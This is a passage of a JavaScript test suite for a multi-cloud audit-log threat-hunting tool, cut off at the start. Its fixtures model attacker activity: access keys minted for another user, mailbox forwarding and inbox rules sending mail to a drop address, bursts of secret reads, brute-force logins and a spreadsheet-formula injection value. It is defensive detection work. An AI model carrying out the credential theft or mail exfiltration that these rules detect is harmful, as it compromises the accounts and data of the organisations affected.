      assert.equal(fired(n, r.id).length, 0, r.id + " fired on the negative: " + J(fired(n, r.id).map((f) => f.note)));
    });
  }
  test("every rule cites MITRE or a benchmark control and has a recommendation", () => {
    for (const r of RULES) { assert.ok(r.controls.length > 0, r.id); assert.ok(r.recommendation && r.description, r.id); }
  });
});

// ---------------------------------------------------------------------------
// Parsers: one fixture per vendor layout
// ---------------------------------------------------------------------------
group("cloudtrail: parsers", () => {
  test("CloudTrail {\"Records\":[...]} delivery file", () => {
    const d = parseInput({ name: "111122223333_CloudTrail_us-east-1_20261007T1400Z_abc.json", text: J({ Records: [login(user("alice"), true, true, { ip: "198.51.100.7" }), ct("GetSecretValue", "secretsmanager", { t: 5, ro: true, req: { secretId: "db" } })] }) });
    assert.equal(d.platform, "aws");
    assert.equal(d.events.length, 2);
    const e = d.events[0];
    assert.equal(e.principal, "alice"); assert.equal(e.principalType, "IAMUser"); assert.equal(e.action, "ConsoleLogin");
    assert.equal(e.service, "signin"); assert.equal(e.mfa, true); assert.equal(e.status, "success"); assert.equal(e.account, ACCT);
    assert.equal(d.events[1].service, "secretsmanager"); assert.equal(d.events[1].target, "db");
  });
  test("CloudTrail NDJSON (one event per line) and assumed-role principals", () => {
    const ident = { type: "AssumedRole", principalId: "AROA1:ci", arn: "arn:aws:sts::" + ACCT + ":assumed-role/ci-deploy/gh", accountId: ACCT, sessionContext: { sessionIssuer: { type: "Role", arn: "arn:aws:iam::" + ACCT + ":role/ci-deploy", userName: "ci-deploy" }, attributes: { mfaAuthenticated: "false" } } };
    const d = parseInput({ name: "events.ndjson", text: [ct("ListBuckets", "s3", { ident, ro: true }), ct("ListBuckets", "s3", { ident, t: 1, ro: true })].map(J).join("\n") });
    assert.equal(d.files[0].layout, "aws-ndjson");
    assert.equal(d.events[0].principal, "role/ci-deploy/gh"); assert.equal(d.events[0].mfa, false);
  });
  test("CloudTrail Athena CSV export (lower-case columns, struct strings)", () => {
    const csv = [
      "eventversion,useridentity,eventtime,eventsource,eventname,awsregion,sourceipaddress,useragent,errorcode,errormessage,requestparameters,responseelements,additionaleventdata,requestid,eventid,resources,eventtype,apiversion,readonly,recipientaccountid,serviceeventdetails,sharedeventid,vpcendpointid",
      '1.09,"{type=IAMUser, principalid=AIDABOB, arn=arn:aws:iam::111122223333:user/bob, accountid=111122223333, invokedby=null, accesskeyid=AKIABOB, username=bob, sessioncontext=null}",2026-10-07T14:00:00Z,iam.amazonaws.com,CreateAccessKey,us-east-1,203.0.113.5,aws-cli/2.17.20,,,"{""userName"":""carol""}","{""accessKey"":{""accessKeyId"":""AKIAIOSFODNN7EXAMPLE"",""status"":""Active"",""userName"":""carol""}}",,r1,e1,,AwsApiCall,,false,111122223333,,,',
    ].join("\n");
    const d = parseInput({ name: "athena.csv", text: csv });
    assert.equal(d.files[0].layout, "aws-athena-csv"); assert.equal(d.files[0].confidence, 1);
    assert.equal(d.events[0].principal, "bob"); assert.equal(d.events[0].ip, "203.0.113.5");
    const r = analyze(d);
    assert.ok(fired(r, "aws-iam-access-key-other").length === 1);
    assert.ok(r.iocs.some((x) => x.type === "aws-access-key-id" && x.value === "AKIAIOSFODNN7EXAMPLE"));
  });
  test("Azure Activity Log JSON ({\"value\": [...]})", () => {
    const d = parseInput({ name: "activity.json", text: J({ value: [az("Microsoft.Compute/virtualMachines/delete", { caller: "ops@test.darknode.ai", ip: "198.51.100.8" })] }) });
    assert.equal(d.platform, "azure");
    const e = d.events[0];
    assert.equal(e.principal, "ops@test.darknode.ai"); assert.equal(e.principalType, "User"); assert.equal(e.account, SUB);
    assert.equal(e.ip, "198.51.100.8"); assert.equal(e.status, "success"); assert.equal(e.readOnly, false);
  });
  test("Azure Log Analytics AzureActivity CSV (TimeGenerated [UTC] header, Properties JSON)", () => {
    const props = J({ eventCategory: "Administrative", requestbody: J({ Properties: { RoleDefinitionId: OWNER, PrincipalId: "p9", Scope: "/subscriptions/" + SUB } }) });
    const csv = [
      "TimeGenerated [UTC],OperationNameValue,Caller,CallerIpAddress,ActivityStatusValue,ResourceGroup,_ResourceId,Category,Authorization,Properties",
      '"10/7/2026, 2:00:00.000 PM",MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE,ops@test.darknode.ai,198.51.100.8,Start,,/subscriptions/' + SUB + '/providers/microsoft.authorization/roleassignments/ra1,Administrative,"' + J({ action: "Microsoft.Authorization/roleAssignments/write", scope: "/subscriptions/" + SUB }).replace(/"/g, '""') + '","' + props.replace(/"/g, '""') + '"',
    ].join("\n");
    const d = parseInput({ name: "AzureActivity.csv", text: csv });
    assert.equal(d.files[0].layout, "azure-la-csv");
    assert.equal(d.events[0].ts, Date.parse("2026-10-07T14:00:00Z"));
    assert.equal(d.events[0].principal, "ops@test.darknode.ai");
    const r = analyze(d);
    assert.equal(fired(r, "az-privileged-role-assignment").length, 1);
    assert.equal(fired(r, "az-privileged-role-assignment")[0].severity, "critical");
  });
  test("GCP LogEntry NDJSON and JSON array (gcloud logging read --format=json)", () => {
    const a = gl("SetIamPolicy", "cloudresourcemanager.googleapis.com", { who: "dev@test.darknode.ai", ip: "198.51.100.9", sd: delta("roles/owner", "user:x@partner.test.darknode.ai") });
    const b = gl("v1.compute.instances.list", "compute.googleapis.com", { t: 2, log: "data_access" });
    const nd = parseInput({ name: "audit.ndjson", text: [a, b].map(J).join("\n") });
    const arr = parseInput({ name: "audit.json", text: J([a, b]) });
    for (const d of [nd, arr]) {
      assert.equal(d.platform, "gcp");
      assert.equal(d.events[0].principal, "dev@test.darknode.ai"); assert.equal(d.events[0].action, "SetIamPolicy");
      assert.equal(d.events[0].service, "cloudresourcemanager.googleapis.com"); assert.equal(d.events[0].ip, "198.51.100.9"); assert.equal(d.events[0].account, "p1");
      assert.equal(d.events[1].logType, "data_access");
    }
    assert.equal(nd.files[0].layout, "gcp-ndjson"); assert.equal(arr.files[0].layout, "gcp-json");
  });
  test("M365 Search-UnifiedAuditLog | Export-Csv: AuditData JSON inside the CSV is parsed and normalised", () => {
    const auditData = ad("New-InboxRule", { ip: "203.0.113.50:51234", user: "finance@test.darknode.ai", params: { Name: ".", ForwardTo: "drop@partner.test.darknode.ai" } });
    const q = (v) => '"' + String(v).replace(/"/g, '""') + '"';
    const csv = "#TYPE Deserialized.Microsoft.Exchange.Management.SystemConfigurationTasks.AuditRecord\r\n" +
      ["RunspaceId", "RecordType", "CreationDate", "UserIds", "Operations", "AuditData", "ResultIndex", "ResultCount", "Identity", "IsValid", "ObjectState"].map(q).join(",") + "\r\n" +
      ["9c1d", "ExchangeAdmin", "10/7/2026 2:00:00 PM", "finance@test.darknode.ai", "New-InboxRule", J(auditData), "1", "1", auditData.Id, "True", "Unchanged"].map(q).join(",") + "\r\n";
    const d = parseInput({ name: "ual.csv", text: csv });
    assert.equal(d.files[0].layout, "m365-ual-csv"); assert.equal(d.files[0].confidence, 1);
    const e = d.events[0];
    assert.equal(e.platform, "m365"); assert.equal(e.principal, "finance@test.darknode.ai"); assert.equal(e.action, "New-InboxRule");
    assert.equal(e.ip, "203.0.113.50"); assert.equal(e.service, "Exchange"); assert.equal(e.req.ForwardTo, "drop@partner.test.darknode.ai");
    assert.equal(e.ts, Date.parse("2026-10-07T14:00:00Z"));
    assert.equal(fired(analyze(d), "m365-inbox-rule").length, 1);
  });
  test("M365 Purview audit search CSV export", () => {
    const auditData = ad("Set-Mailbox", { params: { Identity: "ceo", ForwardingSmtpAddress: "smtp:drop@partner.test.darknode.ai" } });
    const q = (v) => '"' + String(v).replace(/"/g, '""') + '"';
    const csv = ["RecordId", "CreationDate", "RecordType", "Operation", "UserId", "AuditData", "AssociatedAdminUnits", "AssociatedAdminUnitsNames"].map(q).join(",") + "\n" +
      [auditData.Id, "2026-10-07T14:00:00.0000000Z", "ExchangeAdmin", "Set-Mailbox", "user@test.darknode.ai", J(auditData), "", ""].map(q).join(",") + "\n";
    const d = parseInput({ name: "purview.csv", text: csv });
    assert.equal(d.files[0].layout, "m365-purview-csv");
    assert.equal(fired(analyze(d), "m365-mailbox-forwarding").length, 1);
  });
  test("M365 raw AuditData JSON array", () => {
    const d = parseInput({ name: "auditdata.json", text: J([ad("UserLoggedIn", { ...AAD, rt: 15 }), ad("FileDownloaded", { wl: "SharePoint", rt: 6, result: "", t: 1 })]) });
    assert.equal(d.platform, "m365"); assert.equal(d.events.length, 2); assert.equal(d.events[1].status, "success");
  });
  test("several files: mixed platform, per-platform counts and time range", () => {
    const d = parseInput([FILE.aws([ct("ListUsers", "iam", { ro: true })]), FILE.gcp([gl("SetOrgPolicy", "cloudresourcemanager.googleapis.com", { t: 60 })]), FILE.m365([ad("UserLoggedIn", { ...AAD, rt: 15, t: 120 })])]);
    assert.equal(d.platform, "mixed");
    assert.deepEqual(d.stats.perPlatform, { aws: 1, gcp: 1, m365: 1 });
    assert.equal(d.stats.firstTs, at(0)); assert.equal(d.stats.lastTs, at(120));
  });
  test("generic CSV without the required columns is skipped and reported; mapped columns parse", () => {
    const csv = "when,who,what\n2026-10-07T14:00:00Z,alice,DeleteBucket\n";
    const d = parseInput({ name: "siem.csv", text: csv });
    assert.ok(d.skipped.some((s) => /siem\.csv/.test(s.check) && /timestamp, principal, action/.test(s.reason)), J(d.skipped));
    const m = parseInput({ name: "siem.csv", text: csv }, { columns: { timestamp: "when", principal: "who", action: "what" } });
    assert.equal(m.events.length, 1); assert.equal(m.events[0].principal, "alice"); assert.equal(m.skipped.length, 0);
  });
  test("records without a timestamp and unsupported files are reported, not guessed", () => {
    const bad = ct("ListUsers", "iam"); bad.eventTime = "not a date";
    const d = parseInput([FILE.aws([bad, ct("ListUsers", "iam")]), { name: "notes.xml", text: "<a><b/></a>" }]);
    assert.equal(d.events.length, 1);
    assert.ok(d.skipped.some((s) => s.check === "records"));
    assert.ok(d.skipped.some((s) => s.check === "file:notes.xml"));
  });
  test("detectFile classifies each layout from a sample", () => {
    assert.equal(detectFile("a.json", J({ Records: [ct("ListUsers", "iam")] })).platform, "aws");
    assert.equal(detectFile("b.json", J({ value: [az("Microsoft.Compute/virtualMachines/delete")] })).platform, "azure");
    assert.equal(detectFile("c.ndjson", [gl("SetOrgPolicy", "x"), gl("SetOrgPolicy", "x")].map(J).join("\n")).platform, "gcp");
    assert.equal(detectFile("d.csv", '"RecordType","CreationDate","UserIds","Operations","AuditData"\n"1","x","u","op","{}"\n').platform, "m365");
    assert.equal(detectFile("e.csv", "a,b\n1,2\n").confidence < 0.8, true);
  });
});

// ---------------------------------------------------------------------------
// Helpers, windows and thresholds
// ---------------------------------------------------------------------------
group("cloudtrail: helpers and window edges", () => {
  test("parseTs: zone-less ISO is UTC, US AM/PM export dates, epoch", () => {
    assert.equal(parseTs("2026-10-07T14:00:00"), Date.parse("2026-10-07T14:00:00Z"));
    assert.equal(parseTs("10/7/2026 2:00:00 PM"), Date.parse("2026-10-07T14:00:00Z"));
    assert.equal(parseTs("10/7/2026 12:05:00 AM"), Date.parse("2026-10-07T00:05:00Z"));
    assert.ok(Number.isNaN(parseTs("")) || parseTs("") == null || !Number.isFinite(parseTs("")));
  });
  test("parseAthenaStruct reads nested structs and null; cleanIp strips ports and brackets", () => {
    const o = parseAthenaStruct("{type=AssumedRole, arn=arn:aws:sts::1:assumed-role/r/s, sessioncontext={attributes={mfaauthenticated=true}}, invokedby=null}");
    assert.equal(o.type, "AssumedRole"); assert.equal(o.sessioncontext.attributes.mfaauthenticated, "true"); assert.equal(o.invokedby, null);
    assert.equal(cleanIp("203.0.113.5:443"), "203.0.113.5");
    assert.equal(cleanIp("[2001:db8::1]:443"), "2001:db8::1");
  });
  test("windows(): inclusive window, threshold-1 silent, threshold fires, spread-out stays silent", () => {
    const mk = (secs) => secs.map((s, i) => ({ i, ts: T + s * 1000, k: "a" }));
    assert.equal(windows(mk([0, 60, 120, 299]), (e) => e.k, 5, 5).length, 0);
    const w = windows(mk([0, 60, 120, 240, 300]), (e) => e.k, 5, 5);
    assert.equal(w.length, 1); assert.equal(w[0].peak, 5); assert.equal(w[0].total, 5);
    assert.equal(windows(mk([0, 60, 120, 240, 301]), (e) => e.k, 5, 5).length, 0);
  });
  test("secrets burst honours the configured threshold and window", () => {
    const recs = rep(5, (k) => ct("GetSecretValue", "secretsmanager", { t: k * 60, ro: true }));
    assert.equal(fired(hunt("aws", recs, { secretsBurstN: 5, secretsBurstWindowMin: 4 }), "aws-secrets-burst").length, 1);
    assert.equal(fired(hunt("aws", recs, { secretsBurstN: 5, secretsBurstWindowMin: 3 }), "aws-secrets-burst").length, 0);
    assert.equal(fired(hunt("aws", recs, { secretsBurstN: 6, secretsBurstWindowMin: 10 }), "aws-secrets-burst").length, 0);
  });
  test("recon burst per principal: two principals under the threshold each stay silent", () => {
    const recs = rep(30, (k) => ct("DescribeVolumes", "ec2", { t: k, ro: true })).concat(rep(30, (k) => ct("DescribeVolumes", "ec2", { t: k, ro: true, user: "bob" })));
    assert.equal(fired(hunt("aws", recs), "aws-recon-burst").length, 0);
    assert.equal(fired(hunt("aws", recs, { reconBurstN: 30 }), "aws-recon-burst").length, 2);
  });
  test("console failure burst followed by a success from the same IP is critical", () => {
    const recs = rep(10, (k) => login(user("HIDDEN_DUE_TO_SECURITY_REASONS"), false, false, { t: k * 20, ip: "203.0.113.5" })).concat([login(user("alice"), true, true, { t: 400, ip: "203.0.113.5" })]);
    const f = fired(hunt("aws", recs), "aws-console-fail-burst")[0];
    assert.equal(f.severity, "critical"); assert.equal(f.confidence, "confirmed"); assert.equal(f.evidenceCount, 11);
    assert.ok(f.tags.includes("incident-candidate"));
  });
  test("first-seen region needs the baseline: 100 prior events fire, 99 do not, a known region never fires", () => {
    const run = (n, region) => fired(hunt("aws", baseline(n).concat([ct("RunInstances", "ec2", { region })])), "aws-run-instances-new-region").length;
    assert.equal(run(100, "eu-west-1"), 1); assert.equal(run(99, "eu-west-1"), 0); assert.equal(run(150, "us-east-1"), 0);
    assert.equal(run(50, "eu-west-1"), 0);
    assert.equal(fired(hunt("aws", baseline(100).concat([ct("RunInstances", "ec2", { region: "eu-west-1" })]), { baselineMinEvents: 50 }), "aws-run-instances-new-region").length, 1);
  });
  test("trusted accounts silence cross-account AssumeRole, external trust and snapshot shares", () => {
    const recs = [
      ct("AssumeRole", "sts", { ident: user("x", FOREIGN), req: { roleArn: "arn:aws:iam::" + ACCT + ":role/v" } }),
      ct("CreateRole", "iam", { req: { roleName: "v", assumeRolePolicyDocument: J(pol({ AWS: "arn:aws:iam::" + FOREIGN + ":root" })) } }),
      ct("ModifySnapshotAttribute", "ec2", { req: { snapshotId: "snap-1", createVolumePermission: { add: { items: [{ userId: FOREIGN }] } } } }),
    ];
    const open = hunt("aws", recs);
    assert.equal(fired(open, "aws-assume-role-untrusted")[0].confidence, "review");
    assert.equal(fired(open, "aws-iam-role-external-trust").length, 1);
    assert.equal(fired(open, "aws-snapshot-share").length, 1);
    const trusted = hunt("aws", recs, { trustedAccounts: FOREIGN });
    for (const id of ["aws-assume-role-untrusted", "aws-iam-role-external-trust", "aws-snapshot-share"]) assert.equal(fired(trusted, id).length, 0, id);
  });
  test("malicious-IP join: skipped without a list, failed-only calls are medium, ioc exported", () => {
    const recs = [okSt(ct("ListUsers", "iam", { ip: "203.0.113.99" }))];
    const none = hunt("aws", recs);
    assert.equal(status(none, "x-malicious-ip"), "skipped");
    assert.ok(none.skipped.some((s) => s.check === "x-malicious-ip"));
    const r = hunt("aws", recs, { maliciousIps: ["203.0.113.99"] });
    assert.equal(fired(r, "x-malicious-ip")[0].severity, "medium");
    assert.ok(r.tables.ips.find((x) => x.ip === "203.0.113.99").malicious);
    const ok = hunt("aws", [ct("ListUsers", "iam", { ip: "203.0.113.99", ro: true })], { maliciousIps: { data: [{ ip: "203.0.113.99", score: 7, source: "ipsum" }] } });
    assert.equal(fired(ok, "x-malicious-ip")[0].severity, "high");
  });
  test("impossible travel is skipped without geo and reports the speed with it", () => {
    const [, pos, , opts] = CASES["x-impossible-travel"];
    assert.equal(status(hunt("aws", pos), "x-impossible-travel"), "skipped");
    const f = fired(hunt("aws", pos, opts), "x-impossible-travel")[0];
    assert.ok(/km\/h/.test(f.note), f.note);
    assert.equal(fired(hunt("aws", pos, { ...opts, travelKmh: 50000 }), "x-impossible-travel").length, 0);
  });
  test("after-hours window: overnight, weekends, offset and off switch", () => {
    const ah = { enabled: true, start: 20, end: 6, utcOffset: 0, weekends: true };
    assert.equal(isAfterHours(Date.parse("2026-10-07T23:00:00Z"), ah), true);
    assert.equal(isAfterHours(Date.parse("2026-10-07T14:00:00Z"), ah), false);
    assert.equal(isAfterHours(Date.parse("2026-10-10T14:00:00Z"), ah), true);
    assert.equal(isAfterHours(Date.parse("2026-10-07T14:00:00Z"), { ...ah, utcOffset: 8 }), true);
    const r = hunt("aws", [ct("CreateUser", "iam", { t: 9 * 3600, req: { userName: "x" } })], { afterHours: { enabled: false } });
    assert.equal(status(r, "x-after-hours-admin"), "skipped");
  });
  test("rules whose required field is absent are skipped with a reason", () => {
    const noUa = ct("DescribeInstances", "ec2", { ro: true }); noUa.userAgent = "";
    const r = hunt("aws", [noUa]);
    assert.equal(status(r, "aws-ua-anomaly"), "skipped");
    assert.ok(r.skipped.some((s) => s.check === "aws-ua-anomaly" && /\bua\b/.test(s.reason)));
    assert.equal(status(r, "az-nsg-open"), "n/a");
  });
});

// ---------------------------------------------------------------------------
// Results, exports, determinism
// ---------------------------------------------------------------------------
group("cloudtrail: results and exports", () => {
  const ex = exampleDataset();
  const r = analyze(ex.files, { now: ex.now });
  test("in-engine self-test passes", () => {
    const s = selfTest();
    assert.ok(s.pass, "failed: " + s.tests.filter((t) => !t.pass).map((t) => t.name).join(", "));
  });
  test("example: ~400 CloudTrail records plus Azure, GCP and M365 samples with hits on each", () => {
    assert.equal(r.summary.platforms.aws, 403);
    for (const p of ["azure", "gcp", "m365"]) assert.ok(r.findings.filter((f) => f.platform === p).length >= 2, p);
    assert.ok(r.summary.critical >= 5);
  });
  test("analyze is deterministic (byte-identical JSON) and independent of file order", () => {
    assert.equal(J(analyze(ex.files, { now: ex.now })), J(r));
    // raw/event are positional indices into the input, so they legitimately move with file order
    const strip = (fs) => J(fs.map((f) => ({ ...f, evidence: f.evidence.map(({ raw, event, ...rest }) => rest) })));
    assert.equal(strip(analyze(ex.files.slice().reverse(), { now: ex.now }).findings), strip(r.findings));
  });
  test("findings are sorted by severity then confidence and carry the contract fields", () => {
    const SR = { critical: 4, high: 3, medium: 2, low: 1, info: 0 };
    for (let i = 1; i < r.findings.length; i++) assert.ok(SR[r.findings[i - 1].severity] >= SR[r.findings[i].severity]);
    for (const f of r.findings) {
      assert.ok(["confirmed", "likely", "review"].includes(f.confidence));
      assert.ok(f.controls.length >= 1 && f.evidence.length <= 50 && f.evidenceCount >= f.evidence.length);
      assert.ok(f.assets.every((a) => ["IDENTITY", "ASSET", "DOMAIN", "IP", "VENDOR", "VULNERABILITY"].includes(a.type)));
    }
    const id = r.findings.find((f) => f.ruleId === "aws-root-console-login").assets.find((a) => a.type === "IDENTITY");
    assert.deepEqual(Object.keys(id.data).sort(), ["account", "events", "flags", "platform"]);
  });
  test("evidence rows point at the retained raw record", () => {
    const f = r.findings.find((x) => x.ruleId === "aws-s3-public");
    const raw = JSON.parse(r.rawRecords[f.evidence[0].raw]);
    assert.equal(raw.eventName, "PutBucketPolicy");
  });
  test("tables: principals ranked by risk, per-hour timeline covers the span, rules table lists every rule", () => {
    assert.equal(r.tables.principals[0].risk, 100);
    assert.equal(r.summary.timelineUnit, "hour");
    assert.equal(r.tables.timeline.reduce((n, b) => n + b.events, 0), r.summary.events);
    assert.equal(r.tables.rules.length, RULES.length);
    assert.ok(r.tables.rules.every((x) => ["fired", "silent", "skipped", "n/a"].includes(x.status)));
  });
  test("findingsToCsv header row and one line per finding", () => {
    const lines = findingsToCsv(r.findings).trim().split("\n");
    assert.equal(lines[0], "id,severity,confidence,platform,category,title,evidence_count,first_seen,last_seen,principals,ips,mitre,controls,description,recommendation");
    assert.ok(lines.length >= r.findings.length + 1);
  });
  test("IOC export: type,value,context with the minted key, forward address and attacker IP", () => {
    const csv = iocsToCsv(r.iocs);
    assert.equal(csv.split("\n")[0], "type,value,context");
    assert.ok(/aws-access-key-id,AKIAIOSFODNN7EXAMPLE,aws-iam-access-key-other/.test(csv));
    assert.ok(/email,collect@partner\.test\.darknode\.ai,m365-inbox-rule/.test(csv));
    assert.ok(/\nip,203\.0\.113\.50,/.test(csv));
  });
  test("query export re-expresses fired rules per platform", () => {
    const q = queriesText(r, {});
    assert.ok(/FROM cloudtrail_logs[\s\S]*eventname IN \('StopLogging'/.test(q));
    assert.ok(/HAVING count\(\*\) >= 20/.test(q));
    assert.ok(/AzureActivity[\s\S]*OperationNameValue in~ \("Microsoft\.Authorization\/roleAssignments\/write"\)/.test(q));
    assert.ok(/protoPayload\.methodName:\("SetIamPolicy"\)/.test(q));
    assert.ok(/Search-UnifiedAuditLog -StartDate "2026-10-01 08:01" -EndDate "2026-10-04 04:15" -Operations "New-InboxRule","Set-InboxRule","UpdateInboxRules"/.test(q));
  });
  test("principal, timeline and summary exports", () => {
    assert.ok(principalsToCsv(r.tables.principals).startsWith("principal,platform,type,account,events,failures,ips,services,first,last,findings,maxSeverity,risk,flags\n"));
    assert.ok(timelineToCsv(r.tables.timeline).startsWith("bucket_start,events,failures,flagged\n"));
    const s = summaryText(r);
    assert.ok(/Findings: \d+ \(critical \d+/.test(s) && /Skipped checks:/.test(s));
  });
  test("CSV cells are formula-guarded", () => {
    const csv = findingsToCsv([{ id: "x", severity: "low", confidence: "review", title: "=HYPERLINK(1)", controls: [{ framework: "NIST-800-53", id: "AU-6" }], evidence: [] }]);
    assert.ok(csv.includes("'=HYPERLINK(1)"));
  });
  test("empty input: no findings, no throw, rules n/a", () => {
    const e = analyze("");
    assert.equal(e.findings.length, 0); assert.equal(e.meta.rows, 0);
    assert.ok(e.tables.rules.every((x) => x.status === "n/a"));
    assert.equal(parseInput("").events.length, 0);
  });
  test("module constants", () => {
    assert.equal(TOOL_ID, "cloudtrail"); assert.ok(VERSION);
    assert.ok(COLUMNS.timestamp.length && DEFAULTS.secretsBurstN === 20);
    assert.equal(classifyHeaders(["eventTime", "eventSource", "eventName", "userIdentity"]).platform, "aws");
  });
});

group("cloudtrail: M365 UserType that is a prototype member is stringified, not a native fn", () => {
  test("UserType 'constructor' yields the literal string, not Object()", () => {
    const e = normalizeM365({ AuditData: { Operation: "Add user.", UserId: "test@test.darknode.ai", UserType: "constructor" } }, 0);
    assert.equal(e.principalType, "constructor");
    assert.equal(typeof e.principalType, "string");
  });
  test("a real numeric UserType still maps (2 -> Admin)", () => {
    const e = normalizeM365({ AuditData: { Operation: "Add user.", UserId: "test@test.darknode.ai", UserType: 2 } }, 0);
    assert.equal(e.principalType, "Admin");
  });
});
